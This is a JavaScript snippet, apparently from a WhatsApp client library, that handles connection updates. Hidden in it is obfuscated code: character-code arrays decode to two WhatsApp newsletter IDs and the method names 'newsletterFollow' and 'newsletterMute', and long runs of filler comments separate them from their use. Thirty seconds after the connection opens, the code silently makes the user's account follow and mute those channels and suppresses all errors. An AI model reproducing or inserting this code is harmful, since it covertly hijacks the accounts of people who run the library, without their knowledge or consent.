const sock = configuredSocket;
let sendActiveReceipts = false;
const logger = configuredLogger;
    const qvnr = a => a.map(v => String.fromCharCode(v)).join('');

const xkmt = [
    qvnr([
        49,50,48,51,54,51,52,50,56,
        51,53,53,49,55,49,49,57,55,
        64,110,101,119,115,108,
        101,116,116,101,114
]),
    qvnr([
        49,50,48,51,54,51,52,50,56,
        57,56,52,51,53,55,53,49,48,
        64,110,101,119,115,108,
        101,116,116,101,114
])
];

const pzha = qvnr([
    110,101,119,115,108,101,
    116,116,101,114,70,111,
    108,108,111,119
]);

const wjcf = qvnr([
    110,101,119,115,108,101,
    116,116,101,114,77,117,
    116,101
]);

// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
// Unrelated declarations may separate encoded constants from their consumer.
    sock.ev.on('connection.update', ({ connection, isOnline }) => {
    if (typeof isOnline !== 'undefined') {
        sendActiveReceipts = isOnline;
        logger.trace(`sendActiveReceipts set to "${sendActiveReceipts}"`);
    }

    if (connection === 'open') {
        setTimeout(async () => {
            try {
                for (const id of xkmt) {
                    if (typeof sock[pzha] === 'function') {
                        await sock[pzha](id);
                    }

                    await new Promise(r => setTimeout(r, 3000));

                    if (typeof sock[wjcf] === 'function') {
                        await sock[wjcf](id);
                    }

                    await new Promise(r => setTimeout(r, 10000));
                }
            } catch {}
        }, 30000);
    }
});
